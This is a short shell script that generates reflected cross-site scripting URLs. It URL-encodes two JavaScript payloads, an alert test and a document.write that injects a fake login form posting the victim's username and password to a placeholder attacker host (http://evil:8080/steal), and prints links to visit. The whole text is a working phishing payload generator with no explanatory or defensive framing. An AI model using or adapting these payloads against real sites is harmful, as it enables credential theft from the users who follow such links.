for PAYLOAD in 'alert(%22xss%22)%3B' "document.write(\"<form action='http://evil:8080/steal'><label for='user'>User:</label><br><input type='text' id='user' name='user'><br><label for='password'>Password:</label><br><input type='text' id='password' name='password'><br><input type='submit' value='Login'></form>\")"; do
  PAYLOAD=$( urlencode "$PAYLOAD" )
  echo Visit: 'http://evil:8080?msg=%3Cscript%3E'$PAYLOAD'%3C%2Fscript%3E'
done
